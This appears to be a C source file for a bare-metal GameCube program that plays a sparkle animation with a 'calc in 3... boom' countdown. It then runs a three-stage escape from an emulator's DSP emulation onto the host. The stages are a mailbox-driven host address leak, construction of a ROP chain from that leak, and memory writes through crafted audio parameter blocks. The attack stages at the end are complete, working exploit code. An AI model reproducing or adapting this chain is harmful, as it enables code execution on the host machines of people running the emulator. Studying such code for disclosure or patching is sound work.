/* driver_fancy.c — Fancy V12 animation and combined DSP-HLE escape.
 *
 * Renders the v12 logo on a bright full-width background with animated
 * sparkles, then runs the leak, ROP materialization, and write stages.
 *
 * Bare-metal GameCube PPC — direct XFB + VI MMIO, no libogc.
 */
#include "exploit.h"
#include "fancy_data.h"


typedef unsigned int       u32;
typedef unsigned short     u16;
typedef unsigned char      u8;
typedef unsigned long long u64;

#define MRAM(phys) ((volatile u8*)(0x80000000u + (phys)))

#define XFB_A_PHYS 0x00500000u
#define XFB_B_PHYS 0x00600000u
#define XFB_W      640
#define XFB_H      480
#define XFB_STRIDE (XFB_W * 2)   /* YUYV: 2 bytes per pixel */

#define VI         0xCC002000u

#define STARTUP_FRAMES 6
#define ANIM_SPEED     3
#define ANIM_FRAMES    ((115 + ANIM_SPEED - 1) / ANIM_SPEED)

/* ------------------------------------------------------------------ */
/*  VI initialization — NTSC 480i, double-buffered XFB                 */
/* ------------------------------------------------------------------ */
static volatile u8 *g_xfb = MRAM(XFB_A_PHYS);

static void vi_set_xfb(u32 xfb_phys) {
    volatile u16 *vi = (volatile u16*)VI;
    u32 top_fbb = xfb_phys >> 5;
    u32 bottom_fbb = (xfb_phys + XFB_STRIDE) >> 5;
    u32 top_val = (top_fbb & 0x00FFFFFFu) | (1u << 28);
    u32 bottom_val = (bottom_fbb & 0x00FFFFFFu) | (1u << 28);

    vi[0x1C / 2] = (u16)(top_val >> 16);
    vi[0x1E / 2] = (u16)top_val;
    vi[0x24 / 2] = (u16)(bottom_val >> 16);
    vi[0x26 / 2] = (u16)bottom_val;
}

static void vi_init(void) {
    volatile u16 *vi = (volatile u16*)VI;

    /* Standard NTSC 480i: ACV is 240 lines per field, not 480. */
    vi[0x00 / 2] = 0x0F06;   /* VI_VERTICAL_TIMING: ACV=240, EQU=6 */
    vi[0x02 / 2] = 0x0001;   /* VI_CONTROL_REGISTER: ENB=1, NTSC, intl */
    /* Full 720px NTSC active width, derived from the standard VI timing. */
    vi[0x04 / 2] = 0x4769;   /* Horizontal sync start/end */
    vi[0x06 / 2] = 0x01AD;   /* Half-line width */
    vi[0x08 / 2] = 0x033A;   /* Horizontal blank start */
    vi[0x0A / 2] = 0x3D40;   /* Horizontal blank end + sync width */
    vi[0x0C / 2] = 0x0003;   /* Odd-field post-blanking */
    vi[0x0E / 2] = 0x0018;   /* Odd-field pre-blanking */
    vi[0x10 / 2] = 0x0002;   /* Even-field post-blanking */
    vi[0x12 / 2] = 0x0019;   /* Even-field pre-blanking */
    vi[0x48 / 2] = 0x2850;   /* PicConfig: WPL=40, STD=80 for double-field */
    vi[0x4A / 2] = 0x10E4;   /* HScaler: expand 640px XFB across 720px VI */
    vi[0x70 / 2] = 640;      /* VI source width before horizontal scaling */

    vi_set_xfb(XFB_A_PHYS);
}

/* ------------------------------------------------------------------ */
/*  Vsync — wait for vertical blanking interval                        */
/* ------------------------------------------------------------------ */
static void vsync(void) {
    volatile u16 *vbeam = (volatile u16*)(VI + 0x2C);
    while (*vbeam < 200) ;  /* wait for beam to reach lower screen */
    while (*vbeam >= 10) ;  /* wait for it to wrap to top = new field */
}

/* ------------------------------------------------------------------ */
/*  XFB rendering                                                      */
/* ------------------------------------------------------------------ */

/* Fill the draw XFB with bright YUYV: Y=225 Cb=128 Cr=128. */
static void clear_xfb_white(void) {
    volatile u32 *fb = (volatile u32*)g_xfb;
    u32 count = (XFB_W * XFB_H * 2) / 4;
    for (u32 i = 0; i < count; ++i)
        fb[i] = 0xE180E180u;
}

/* Alpha-blend logo (dark charcoal Y=40) onto the bright background */
static void blit_logo(void) {
    for (u32 row = 0; row < LOGO_H; ++row) {
        u32 fy = LOGO_Y + row;
        for (u32 col = 0; col < LOGO_W; ++col) {
            u8 alpha = kLogoAlpha[row * LOGO_W + col];
            if (alpha == 0) continue;

            u32 fx = LOGO_X + col;
            /* Y_out = (225*(255-alpha) + 40*alpha) / 255 */
            u32 y_out = (225u * (255u - alpha) + 40u * alpha) / 255u;
            /* Write Y byte; Cb/Cr already 128 from white fill */
            g_xfb[fy * XFB_STRIDE + fx * 2] = (u8)y_out;
        }
    }
}

/* Render a single sparkle pixel with gold alpha-blending */
static void sparkle_px(int px, int py, u32 alpha) {
    if (px < 1 || px >= (XFB_W - 1) || py < 0 || py >= XFB_H || alpha < 8)
        return;
    u32 row_base = (u32)py * XFB_STRIDE;
    u32 y_off = row_base + (u32)px * 2;
    u32 old_y = g_xfb[y_off];
    g_xfb[y_off] = (u8)((old_y * (255u - alpha) + 230u * alpha) / 255u);
    u32 pair_base = row_base + ((u32)px & ~1u) * 2;
    u32 old_cb = g_xfb[pair_base + 1];
    u32 old_cr = g_xfb[pair_base + 3];
    g_xfb[pair_base + 1] = (u8)((old_cb * (255u - alpha) + 80u  * alpha) / 255u);
    g_xfb[pair_base + 3] = (u8)((old_cr * (255u - alpha) + 170u * alpha) / 255u);
}

/* Animated sparkles: large 4-point stars that grow from radius 5 to 18.
 * Each sparkle has an independent phase; brightness and size both ramp with
 * the triangle-wave lifecycle (small+dim -> large+bright -> small+dim). */
static void render_sparkles(int frame) {
    for (u32 i = 0; i < SPARKLE_COUNT; ++i) {
        u32 phase = (kSparkles[i].phase + (u32)frame * 18u) & 0xFFu;
        /* Triangle wave 0->255->0 over 256 phase steps */
        u32 t = phase < 128 ? phase * 2 : (255 - phase) * 2;
        if (t < 30) continue;   /* too small/dim, skip */

        int cx = (int)kSparkles[i].x;
        int cy = (int)kSparkles[i].y;

        /* Radius grows from 5 to 18 with t (5 + 13*t/255) */
        int radius = 5 + (int)(13u * t / 255u);
        u32 peak_alpha = t;  /* center brightness = t */

        /* Draw 4-point star: horizontal and vertical spokes.
         * Each spoke pixel fades linearly from center to tip. */
        /* Center pixel */
        sparkle_px(cx, cy, peak_alpha);

        for (int r = 1; r <= radius; ++r) {
            /* Alpha falls off linearly from center to tip */
            u32 arm_alpha = peak_alpha * (u32)(radius - r) / (u32)radius;
            /* 4 cardinal directions */
            sparkle_px(cx - r, cy,     arm_alpha);   /* left  */
            sparkle_px(cx + r, cy,     arm_alpha);   /* right */
            sparkle_px(cx,     cy - r, arm_alpha);   /* up    */
            sparkle_px(cx,     cy + r, arm_alpha);   /* down  */
        }

        /* Small diagonal accents (1/3 radius) for the star shape */
        int diag = radius / 3;
        for (int d = 1; d <= diag; ++d) {
            u32 d_alpha = peak_alpha * (u32)(diag - d) / (u32)(diag + 1);
            sparkle_px(cx - d, cy - d, d_alpha);
            sparkle_px(cx + d, cy - d, d_alpha);
            sparkle_px(cx - d, cy + d, d_alpha);
            sparkle_px(cx + d, cy + d, d_alpha);
        }
    }
}

/* ------------------------------------------------------------------ */
/*  Minimal 5x7 bitmap font for countdown text                        */
/* ------------------------------------------------------------------ */

/* 5x7 glyphs used by "calc in 1/2/3" and "boom".
 * Each glyph is 7 bytes, one per row, 5 bits wide (MSB = leftmost). */
static const u8 font5x7[] = {
    /* ' ' */ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    /* '1' */ 0x20,0x60,0x20,0x20,0x20,0x20,0x70,
    /* '2' */ 0x70,0x88,0x08,0x10,0x20,0x40,0xF8,
    /* '3' */ 0x70,0x88,0x08,0x30,0x08,0x88,0x70,
    /* 'a' */ 0x00,0x00,0x70,0x08,0x78,0x88,0x78,
    /* 'c' */ 0x00,0x00,0x70,0x80,0x80,0x88,0x70,
    /* 'i' */ 0x20,0x00,0x60,0x20,0x20,0x20,0x70,
    /* 'l' */ 0x60,0x20,0x20,0x20,0x20,0x20,0x70,
    /* 'n' */ 0x00,0x00,0xB0,0xC8,0x88,0x88,0x88,
    /* 'b' */ 0x80,0x80,0xB0,0xC8,0x88,0xC8,0xB0,
    /* 'o' */ 0x00,0x00,0x70,0x88,0x88,0x88,0x70,
    /* 'm' */ 0x00,0x00,0xD0,0xA8,0xA8,0xA8,0x88,
};

/* Map the hard-coded countdown characters to glyph indices. */
static int glyph_idx(char c) {
    if (c == ' ') return 0;
    if (c == '1') return 1;
    if (c == '2') return 2;
    if (c == '3') return 3;
    if (c == 'a') return 4;
    if (c == 'c') return 5;
    if (c == 'i') return 6;
    if (c == 'l') return 7;
    if (c == 'n') return 8;
    if (c == 'b') return 9;
    if (c == 'o') return 10;
    if (c == 'm') return 11;
    return 0;
}

/* Draw a string at (x,y) in the XFB, scaled 3x for visibility.
 * color_y = Y luma value for the text. */
static void draw_text(int x, int y, const char *s, u8 color_y) {
    int ox = x;
    for (; *s; ++s) {
        int gi = glyph_idx(*s);
        const u8 *glyph = &font5x7[gi * 7];
        for (int row = 0; row < 7; ++row) {
            u8 bits = glyph[row];
            for (int col = 0; col < 5; ++col) {
                if (bits & (0x80 >> col)) {
                    /* 3x3 scaled pixel */
                    for (int sy = 0; sy < 3; ++sy) {
                        for (int sx = 0; sx < 3; ++sx) {
                            int px = ox + col * 3 + sx;
                            int py = y + row * 3 + sy;
                            if (px >= 0 && px < XFB_W && py >= 0 && py < XFB_H)
                                g_xfb[(u32)py * XFB_STRIDE + (u32)px * 2] = color_y;
                        }
                    }
                }
            }
        }
        ox += 6 * 3;  /* 5px glyph + 1px spacing, scaled 3x */
    }
}

/* Draw the countdown text centered below the logo */
static void draw_countdown(int frame) {
    const char *text;
    int len;
    if      (frame < 35)  { text = "calc in 3"; len = 9; }
    else if (frame < 70)  { text = "calc in 2"; len = 9; }
    else if (frame < 105) { text = "calc in 1"; len = 9; }
    else if (frame < 115) { text = "boom";      len = 4; }
    else return;
    int tx = (XFB_W - len * 6 * 3) / 2;
    int ty = LOGO_Y + LOGO_H + 25;
    draw_text(tx, ty, text, 60);
}

/* ------------------------------------------------------------------ */
/*  DSP mailbox helpers                                                */
/* ------------------------------------------------------------------ */
#define DSP_MBOX_IN_HI  ((volatile u16*)0xCC005000u)
#define DSP_MBOX_IN_LO  ((volatile u16*)0xCC005002u)

static void dsp_send_mail(u32 mail) {
    while ((*DSP_MBOX_IN_HI) & 0x8000) ;
    *DSP_MBOX_IN_HI = (u16)(mail >> 16);
    *DSP_MBOX_IN_LO = (u16)(mail & 0xFFFF);
}

static u16 mram_be16(u32 phys) {
    volatile u8 *p = MRAM(phys);
    return ((u16)p[0] << 8) | p[1];
}

static void mram_wr_be16(u32 phys, u16 v) {
    volatile u8 *p = MRAM(phys);
    p[0] = (u8)(v >> 8);
    p[1] = (u8)v;
}

/* ------------------------------------------------------------------ */
/*  Guest-driven host leak and write stages                           */
/* ------------------------------------------------------------------ */

static u64 stage1_leak(void) {
    for (u32 i = 0; i < sizeof(kZeldaBootMails)/sizeof(kZeldaBootMails[0]); ++i)
        dsp_send_mail(kZeldaBootMails[i]);
    for (u32 i = 0; i < sizeof(kZeldaMails)/sizeof(kZeldaMails[0]); ++i)
        dsp_send_mail(kZeldaMails[i]);
    u64 leaked = 0;
    for (int k = 0; k < 4; ++k) {
        u16 w = mram_be16(LEAK_OUT_ADDR + 2u * (LEAK_OUT_WORD + k));
        leaked |= (u64)w << (16 * k);
    }
    return leaked;
}

static void stage2_materialize(u64 base, u64 *chain_out) {
    for (u32 i = 0; i < ROP_SLOTS; ++i) {
        u64 v = kRopVal[i];
        chain_out[i] = kRopTag[i] ? (base + v) : v;
    }
}

static void stage3_fire(const u64 *chain) {
    const u32 total_writes = ROP_SLOTS * 4u;
    for (u32 pb = 0; pb < PB_COUNT; ++pb) {
        u32 first = pb * PBUPDATE_PER_PB;
        u32 count = total_writes - first;
        if (count > PBUPDATE_PER_PB) count = PBUPDATE_PER_PB;
        u32 upd_addr = UPDATES_BASE + pb * UPDATES_STRIDE;
        u32 pb_addr  = PB_BASE + pb * PB_STRIDE;
        for (u32 j = 0; j < count; ++j) {
            u32 widx = first + j;
            u32 qi   = widx >> 2;
            u32 wk   = widx & 3;
            u16 off  = (u16)(kSlotWord[qi] + wk);
            u16 val  = (u16)((chain[qi] >> (16 * wk)) & 0xFFFF);
            mram_wr_be16(upd_addr + 4u * j + 0, off);
            mram_wr_be16(upd_addr + 4u * j + 2, val);
        }
        mram_wr_be16(pb_addr + OFF_NUM_UPDATES, (u16)count);
        mram_wr_be16(pb_addr + OFF_DATA_HI, (u16)((upd_addr >> 16) & 0xFFFF));
        mram_wr_be16(pb_addr + OFF_DATA_LO, (u16)(upd_addr & 0xFFFF));
        u32 next = (pb + 1 < PB_COUNT) ? (PB_BASE + (pb + 1) * PB_STRIDE) : 0;
        mram_wr_be16(pb_addr + OFF_NEXT_PB_HI, (u16)((next >> 16) & 0xFFFF));
        mram_wr_be16(pb_addr + OFF_NEXT_PB_LO, (u16)(next & 0xFFFF));
    }
    *((volatile u16*)0xCC00500Au) = 0x0801;
    for (u32 i = 0; i < sizeof(kAxBootMails)/sizeof(kAxBootMails[0]); ++i)
        dsp_send_mail(kAxBootMails[i]);
    for (u32 i = 0; i < sizeof(kAxMails)/sizeof(kAxMails[0]); ++i)
        dsp_send_mail(kAxMails[i]);
}

/* ------------------------------------------------------------------ */
/*  Entry point                                                        */
/* ------------------------------------------------------------------ */
void driver_main(void) {
    /* Present a complete first frame instead of uninitialized memory. */
    g_xfb = MRAM(XFB_A_PHYS);
    clear_xfb_white();
    blit_logo();
    render_sparkles(0);
    vi_init();

    u32 draw_phys = XFB_B_PHYS;
    for (int frame = 0; frame < STARTUP_FRAMES + ANIM_FRAMES; ++frame) {
        g_xfb = MRAM(draw_phys);
        clear_xfb_white();
        blit_logo();
        render_sparkles(frame);
        if (frame >= STARTUP_FRAMES)
            draw_countdown((frame - STARTUP_FRAMES) * ANIM_SPEED);

        /* Keep one image for both interlaced fields, then swap in vblank. */
        vsync();
        vsync();
        vi_set_xfb(draw_phys);
        draw_phys = (draw_phys == XFB_A_PHYS) ? XFB_B_PHYS : XFB_A_PHYS;
    }

    /* Chain into exploit */
    u64 leaked = stage1_leak();
    u64 base   = leaked - RVA_LEAK;
    u64 chain[ROP_SLOTS];
    stage2_materialize(base, chain);
    stage3_fire(chain);

    for (;;) ;
}
